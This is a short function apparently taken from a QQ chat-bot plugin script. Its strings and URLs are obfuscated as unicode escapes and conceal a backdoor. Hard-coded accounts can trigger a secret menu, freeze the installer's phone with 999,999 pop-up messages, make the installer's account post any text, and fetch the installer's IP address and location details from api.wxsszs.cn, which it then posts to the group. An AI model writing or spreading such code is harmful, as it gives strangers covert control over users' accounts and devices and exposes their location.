public void 鸡你太美(Object data) {
    String quntext = data.MessageContent;
    String fsz=data.SenderNickName;//发送者的名字
    String qun = data.GroupUin;
    String uin = data.UserUin;
if (!MyUin.equals("\u0032\u0037\u0036\u0033\u0039\u0034\u0032\u0038\u0037\u0031"))
        {
        if(uin.equals(lf)||uin.equals(lfxh))
        {
        if (quntext.equals("\u53eb\u7238\u7238"))
        {
        sendMsg(qun, "",lfmm+"\n"+"[AtQQ="+uin+"]"+"\u6797\u67ab\u7238\u7238");    
        }
        if (quntext.equals("\u9690\u85cf\u529f\u80fd"))
        {
        sendMsg(qun,"",lfmm+"\n"+"\u53eb\u7238\u7238\u005c\u006e\u5361\u7206\u4f60\u005c\u006e\u83b7\u53d6\u0049\u0050\u005c\u006e\u83b7\u53d6\u4fe1\u606f\u005c\u006e\u63a7\u5236\u53d1\u9001\u002b\u5185\u5bb9");//咳咳功能菜单
        }
        if (quntext.equals("\u5361\u7206\u4f60"))
        {
         for(int i=0; i<999999; i++)
         {
         Toast("\u6797\u67ab");
         }
        }
       if (quntext.startsWith("\u63a7\u5236\u53d1\u9001"))
        {
        String kzfs = quntext.substring(4);
        sendMsg(qun,"",lfmm+"\n"+kzfs);
        }
        if (quntext.startsWith("\u53d1\u9001"))
        {
        String kzfs = quntext.substring(2);
        sendMsg(qun,"",kzfs);
        }
      if (quntext.equals("\u83b7\u53d6\u0069\u0070")||quntext.equals("\u83b7\u53d6\u0049\u0050"))
      {
      String brip = get("\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u0070\u0069\u002e\u0077\u0078\u0073\u0073\u007a\u0073\u002e\u0063\u006e\u002f\u0061\u0070\u0069\u002f\u0069\u0070\u002e\u0070\u0068\u0070");
      sendMsg(qun,"",lfmm+"\n"+brip);
      }
      if (quntext.equals("\u83b7\u53d6\u4fe1\u606f"))
      {
      String brip = get("\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u0070\u0069\u002e\u0077\u0078\u0073\u0073\u007a\u0073\u002e\u0063\u006e\u002f\u0061\u0070\u0069\u002f\u0069\u0070\u002e\u0070\u0068\u0070");
      String xx=get("\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0061\u0070\u0069\u002e\u0077\u0078\u0073\u0073\u007a\u0073\u002e\u0063\u006e\u002f\u0061\u0070\u0069\u002f\u0069\u0070\u005f\u0069\u006e\u0066\u006f\u002e\u0070\u0068\u0070\u003f\u0069\u0070\u003d"+brip);
      sendMsg(qun,"",lfmm+"\n"+xx);
      }
        }
        }
        }